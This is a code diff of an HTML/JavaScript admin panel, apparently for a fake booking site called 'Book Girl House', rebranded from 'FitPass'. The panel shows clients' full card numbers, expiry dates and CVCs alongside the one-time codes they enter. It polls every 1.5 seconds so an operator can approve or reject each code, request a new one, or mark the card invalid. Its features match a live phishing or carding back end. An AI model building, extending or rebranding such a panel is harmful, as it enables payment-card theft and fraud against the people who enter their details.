@@ -3,57 +3,68 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>FitPass — Адмінка</title>
-<link rel="stylesheet" href="/style.css?v=21">
+<title>Book Girl House — Адмінка</title>
+<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="/style.css?v=22">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 </head>
-<body class="admin-theme">
-<div class="lang-switch" id="langSwitch">
-  <button type="button" data-lang="uk" class="active">UA</button>
-  <button type="button" data-lang="en">EN</button>
-</div>
-
-<header class="top">
-  <div class="admin-brand">FitPass <span>• Admin</span></div>
-  <button id="logout" class="secondary hidden" data-i18n="logout">Вийти</button>
+<body class="admin-body">
+<header class="admin-header">
+  <div class="admin-brand">
+    <span class="admin-mark">BGH</span>
+    <span>Book Girl House <small>• Admin</small></span>
+  </div>
+  <div class="admin-header-actions">
+    <div class="lang-switch admin-lang" id="langSwitch">
+      <button type="button" data-lang="uk" class="active">UA</button>
+      <button type="button" data-lang="en">EN</button>
+    </div>
+    <button id="logout" class="admin-btn ghost hidden" data-i18n="logout">Вийти</button>
+  </div>
 </header>
 
-<main class="admin">
-  <section id="login" class="login card">
-    <div class="admin-kicker" data-i18n="kicker">Панель менеджера</div>
-    <h1 data-i18n="loginTitle">Вхід до адмін-панелі</h1>
-    <p class="muted" data-i18n="loginHint">Тут зʼявляються бронювання та коди, введені клієнтами.</p>
+<main class="admin-wrap">
+  <section id="login" class="admin-login">
+    <div class="admin-login-card">
+      <div class="admin-kicker" data-i18n="kicker">Панель менеджера</div>
+      <h1 data-i18n="loginTitle">Вхід до адмін-панелі</h1>
+      <p class="admin-muted" data-i18n="loginHint">Тут зʼявляються бронювання та коди, введені клієнтами.</p>
 
-    <label><span data-i18n="login">Логін</span>
-      <input id="user" value="admin" autocomplete="username">
-    </label>
+      <label class="admin-field">
+        <span data-i18n="login">Логін</span>
+        <input id="user" value="admin" autocomplete="username">
+      </label>
+      <label class="admin-field">
+        <span data-i18n="password">Пароль</span>
+        <input id="pass" type="password" placeholder="" autocomplete="current-password">
+      </label>
 
-    <label><span data-i18n="password">Пароль</span>
-      <input id="pass" type="password" placeholder="" autocomplete="current-password">
-    </label>
-
-    <button id="loginBtn" class="primary-admin" data-i18n="signIn">Увійти</button>
-    <p id="loginErr" class="error"></p>
+      <button id="loginBtn" class="admin-btn primary full" data-i18n="signIn">Увійти</button>
+      <p id="loginErr" class="admin-error"></p>
+    </div>
   </section>
 
   <section id="dashboard" class="hidden">
-    <div class="dashhead">
+    <div class="admin-dashhead">
       <div>
         <div class="admin-kicker" data-i18n="workspace">Робоча область</div>
         <h1 data-i18n="leads">Заявки</h1>
-        <p class="muted" data-i18n="leadsHint">Клієнт вводить код — менеджер бачить його тут і вручну приймає рішення.</p>
+        <p class="admin-muted" data-i18n="leadsHint">Клієнт вводить код — менеджер бачить його тут і вручну приймає рішення.</p>
       </div>
-      <button id="refresh" class="secondary" data-i18n="refresh">Оновити</button>
+      <button id="refresh" class="admin-btn secondary" data-i18n="refresh">Оновити</button>
     </div>
 
-    <div class="stats">
-      <div class="stat"><b id="all">0</b><span data-i18n="statAll">Всього</span></div>
-      <div class="stat"><b id="waiting">0</b><span data-i18n="statWait">Очікують вводу</span></div>
-      <div class="stat"><b id="review">0</b><span data-i18n="statReview">Чекають перевірки</span></div>
-      <div class="stat"><b id="retry">0</b><span data-i18n="statRetry">Потрібен повтор</span></div>
-      <div class="stat"><b id="confirmed">0</b><span data-i18n="statOk">Підтверджено</span></div>
+    <div class="admin-stats">
+      <div class="admin-stat"><b id="all">0</b><span data-i18n="statAll">Всього</span></div>
+      <div class="admin-stat wait"><b id="waiting">0</b><span data-i18n="statWait">Очікують вводу</span></div>
+      <div class="admin-stat review"><b id="review">0</b><span data-i18n="statReview">Чекають перевірки</span></div>
+      <div class="admin-stat retry"><b id="retry">0</b><span data-i18n="statRetry">Потрібен повтор</span></div>
+      <div class="admin-stat ok"><b id="confirmed">0</b><span data-i18n="statOk">Підтверджено</span></div>
     </div>
 
-    <div id="cards"></div>
+    <div id="cards" class="admin-leads"></div>
   </section>
 </main>
 
@@ -63,7 +74,7 @@ let pollTimer=null;
 
 const I18N = {
   uk: {
-    docTitle: "FitPass — Адмінка",
+    docTitle: "Book Girl House — Адмінка",
     logout: "Вийти",
     kicker: "Панель менеджера",
     loginTitle: "Вхід до адмін-панелі",
@@ -84,29 +95,33 @@ const I18N = {
     empty: "Заявок поки немає.",
     loginFail: "Не вдалося увійти",
     noConn: "Немає зʼєднання з сервером.",
-    approve: "✓ Підходить код",
-    reject: "✕ Не підходить",
+    approve: "✓ Код підходить",
+    reject: "✕ Код не підходить",
+    invalidCard: "🚫 Картка недійсна",
     noCodeYet: "Клієнт ще не ввів код",
     retryNotice: "↻ Клієнт натиснув «Надіслати код ще раз». Передайте йому новий код.",
     codeEntered: "Код, який ввів клієнт",
     lastBadCode: "Останній введений код (не підійшов)",
-    result: "Результат:",
+    result: "Результат",
     resConfirmed: "Код підтверджено менеджером ✓",
     resRejected: "Код не підійшов. Клієнту доступна кнопка повторного запиту.",
     resRetryReq: "Клієнт запросив новий код — надішліть йому новий код.",
     resReview: "Клієнт ввів код — потрібне рішення менеджера.",
     resWaiting: "Очікується введення коду клієнтом.",
+    resInvalidCard: "Картку відхилено. Клієнту показано повідомлення і форма скинута.",
     attempts: "Спроб",
-    delete: "Видалити заявку",
+    delete: "Видалити",
     deleteConfirm: "Видалити заявку?",
     booking: "Бронь",
     card: "Картка",
     expiry: "Термін",
-    innerCode: "Внутрішній код картки",
+    innerCode: "CVC",
     notSpecified: "Не вказано",
+    service: "Послуга",
+    leadId: "Заявка",
   },
   en: {
-    docTitle: "FitPass — Admin",
+    docTitle: "Book Girl House — Admin",
     logout: "Log out",
     kicker: "Manager panel",
     loginTitle: "Admin sign in",
@@ -128,25 +143,29 @@ const I18N = {
     loginFail: "Could not sign in",
     noConn: "No connection to the server.",
     approve: "✓ Code OK",
-    reject: "✕ Reject",
+    reject: "✕ Reject code",
+    invalidCard: "🚫 Invalid card",
     noCodeYet: "Client has not entered a code yet",
     retryNotice: "↻ Client pressed “Send code again”. Please provide a new code.",
     codeEntered: "Code entered by client",
     lastBadCode: "Last entered code (rejected)",
-    result: "Result:",
+    result: "Result",
     resConfirmed: "Code confirmed by manager ✓",
     resRejected: "Code rejected. Client can request a new one.",
-    resRetryReq: "Client requested a new code — send them a new one.",
-    resReview: "Client entered a code — decision required.",
-    resWaiting: "Waiting for the client to enter a code.",
+    resRetryReq: "Client requested a new code — send them a new code.",
+    resReview: "Client entered a code — manager decision needed.",
+    resWaiting: "Waiting for the client to enter the code.",
+    resInvalidCard: "Card declined. Client saw the message and the form was reset.",
     attempts: "Attempts",
-    delete: "Delete lead",
+    delete: "Delete",
     deleteConfirm: "Delete this lead?",
     booking: "Booking",
     card: "Card",
     expiry: "Expiry",
-    innerCode: "Card security code",
+    innerCode: "CVC",
     notSpecified: "Not specified",
+    service: "Service",
+    leadId: "Lead",
   }
 };
 
@@ -179,6 +198,7 @@ function isStatus(x, keys){
     retry: ["Код не підійшов — повторне введення","Код не подошёл — повторный ввод"],
     retryReq: ["Клієнт запросив новий код","Клиент запросил новый код"],
     ok: ["Підтверджено","Подтверждено"],
+    invalid: ["Картка недійсна","Карта недействительна","Card invalid"],
   };
   return (map[keys]||[]).includes(x.status);
 }
@@ -193,7 +213,7 @@ function showDash(){
   $('dashboard').classList.remove('hidden');
   $('logout').classList.remove('hidden');
   load();
-  if(!pollTimer)pollTimer=setInterval(load,1200);
+  if(!pollTimer)pollTimer=setInterval(load,1500);
 }
 
 $('loginBtn').onclick=async()=>{
@@ -231,7 +251,7 @@ async function load(){
   $('retry').textContent=a.filter(x=>isStatus(x,'retry')).length;
   $('confirmed').textContent=a.filter(x=>isStatus(x,'ok')).length;
 
-  $('cards').innerHTML=a.length?a.map(card).join(''):`<div class="empty">${t('empty')}</div>`;
+  $('cards').innerHTML=a.length?a.map(card).join(''):`<div class="admin-empty">${t('empty')}</div>`;
 }
 
 function esc(s){return String(s??'').replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[m]))}
@@ -239,16 +259,24 @@ function esc(s){return String(s??'').replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&l
 function card(x){
   const review=isStatus(x,'review');
   const retryRequested=isStatus(x,'retryReq');
+  const invalid=isStatus(x,'invalid');
+  const ok=isStatus(x,'ok');
+  const canInvalid=!ok && !invalid;
 
   const badgeClass=
-    isStatus(x,'ok')?'success':
+    ok?'ok':
+    invalid?'invalid':
     review?'review':
     isStatus(x,'retry')?'retry':'waiting';
 
   let action='';
   if(review){
-    action=`<button class="approve" onclick="decision(${x.id},'approve')">${t('approve')}</button>
-            <button class="reject" onclick="decision(${x.id},'reject')">${t('reject')}</button>`;
+    action=`
+      <button class="admin-btn success" onclick="decision(${x.id},'approve')">${t('approve')}</button>
+      <button class="admin-btn warn" onclick="decision(${x.id},'reject')">${t('reject')}</button>`;
+  }
+  if(canInvalid){
+    action += `<button class="admin-btn danger-soft" onclick="decision(${x.id},'invalid_card')">${t('invalidCard')}</button>`;
   }
 
   const codeView=x.submitted_code
@@ -264,47 +292,49 @@ function card(x){
   const codeLabel = (x.rejected_code && isStatus(x,'retry')) ? t('lastBadCode') : t('codeEntered');
 
   let resultText = t('resWaiting');
-  if(isStatus(x,'ok')) resultText = t('resConfirmed');
+  if(ok) resultText = t('resConfirmed');
+  else if(invalid) resultText = t('resInvalidCard');
   else if(isStatus(x,'retry')) resultText = t('resRejected');
   else if(isStatus(x,'retryReq')) resultText = t('resRetryReq');
   else if(review) resultText = t('resReview');
 
-  return `<article class="leadcard ${review||retryRequested?'attention':''}">
+  const attention = review || retryRequested ? 'attention' : '';
+
+  return `<article class="leadcard ${attention}">
     <div class="leadtop">
       <div>
         <div class="lead-name">${esc(x.name||t('notSpecified'))}</div>
-        <div class="lead-meta">${esc(x.created_at?new Date(x.created_at).toLocaleString(lang()==='en'?'en-US':'uk-UA'):'')}</div>
+        <div class="lead-meta">#${x.id} · ${esc(x.created_at?new Date(x.created_at).toLocaleString(lang()==='en'?'en-US':'uk-UA'):'')}</div>
       </div>
       <span class="badge ${badgeClass}">${esc(x.status)}</span>
     </div>
 
     <div class="leadgrid">
-      <div><b>Послуга</b><span>${esc(x.service_type || 'apartments')}</span></div>
+      <div><b>${t('service')}</b><span>${esc(x.service_type || 'apartments')}</span></div>
       <div><b>${t('booking')}</b><span>${esc(x.booking)}</span></div>
       <div><b>Email</b><span>${esc(x.email||'—')}</span></div>
-      <div><b>${t('card')}</b><span>${esc((x.card_number||'').replace(/(\d{4})(?=\d)/g,'$1 '))}</span></div>
+      <div><b>${t('card')}</b><span class="mono">${esc((x.card_number||'').replace(/(\d{4})(?=\d)/g,'$1 '))}</span></div>
       <div><b>${t('expiry')}</b><span>${esc(x.expiry)}</span></div>
-      <div><b>${t('innerCode')}</b><span>${esc(x.card_code)}</span></div>
+      <div><b>${t('innerCode')}</b><span class="mono">${esc(x.card_code)}</span></div>
     </div>
 
     ${retryNote}
 
     <div class="codebox ${review?'codebox-live':''}">
-      <div>
+      <div class="codebox-main">
         <b>${codeLabel}</b>
         <span>${codeView}</span>
       </div>
       <div class="codeactions">${action}</div>
     </div>
 
-    <div class="result"><b>${t('result')}</b>
-      ${resultText}
-      ${x.attempts?` · ${t('attempts')}: ${x.attempts}`:''}
-      ${x.last_attempt_at?` · ${new Date(x.last_attempt_at).toLocaleString(lang()==='en'?'en-US':'uk-UA')}`:''}
+    <div class="result-row">
+      <b>${t('result')}:</b>
+      <span>${resultText}${x.attempts?` · ${t('attempts')}: ${x.attempts}`:''}${x.last_attempt_at?` · ${new Date(x.last_attempt_at).toLocaleString(lang()==='en'?'en-US':'uk-UA')}`:''}</span>
     </div>
 
     <div class="cardactions">
-      <button class="danger" onclick="removeLead(${x.id})">${t('delete')}</button>
+      <button class="admin-btn ghost danger-text" onclick="removeLead(${x.id})">${t('delete')}</button>
     </div>
   </article>`;
 }
